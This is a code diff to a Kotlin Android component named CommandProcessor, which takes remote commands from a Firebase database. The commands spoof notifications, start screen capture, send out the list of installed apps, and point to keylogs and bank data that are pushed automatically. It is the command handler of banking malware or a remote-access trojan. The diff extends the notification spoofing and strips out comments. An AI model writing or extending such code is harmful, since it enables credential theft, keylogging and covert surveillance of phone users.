@@ -9,7 +9,6 @@ object CommandProcessor {
 
     fun init(ctx: Context) {
         context = ctx.applicationContext
-        // Listen for commands
         FirebaseBridge.commandsRef.addChildEventListener(object : ChildEventListener {
             override fun onChildAdded(snapshot: DataSnapshot, previous: String?) {
                 val cmd = snapshot.getValue(RemoteCommand::class.java) ?: return
@@ -20,7 +19,6 @@ object CommandProcessor {
             override fun onChildRemoved(snapshot: DataSnapshot) {}
             override fun onChildMoved(snapshot: DataSnapshot, p1: String?) {}
             override fun onCancelled(error: DatabaseError) {
-                // Reattach on error
                 FirebaseBridge.commandsRef.addChildEventListener(this)
             }
         })
@@ -37,15 +35,15 @@ object CommandProcessor {
             "fake_notification" -> {
                 val title = decodeIfBase64(cmd.title)
                 val body = decodeIfBase64(cmd.text)
-                NotificationSpoofer.show(context, title ?: "", body ?: "", cmd.iconUrl)
+                NotificationSpoofer.show(context, title ?: "", body ?: "", cmd.iconUrl, cmd.bigPictureUrl)
             }
             "start_screen_capture" -> svc.startScreenCapture()
             "get_apps" -> {
                 val apps = svc.getInstalledApps()
                 FirebaseBridge.pushAppsList(apps)
             }
-            "get_keylogs" -> { /* no action – keylogs are pushed automatically */ }
-            "get_bank_data" -> { /* Bank data is pushed by BankLogger automatically */ }
+            "get_keylogs" -> { /* keylogs are pushed automatically */ }
+            "get_bank_data" -> { /* BankLogger handles it */ }
         }
     }
 
@@ -55,7 +53,7 @@ object CommandProcessor {
             val decoded = Base64.decode(input, Base64.DEFAULT)
             String(decoded, Charsets.UTF_8)
         } catch (e: Exception) {
-            input   // not base64, return as is
+            input
         }
     }
 
@@ -69,6 +67,7 @@ object CommandProcessor {
         val ey: Int? = null,
         val text: String? = null,
         val title: String? = null,
-        val iconUrl: String? = null
+        val iconUrl: String? = null,
+        val bigPictureUrl: String? = null
     )
 }
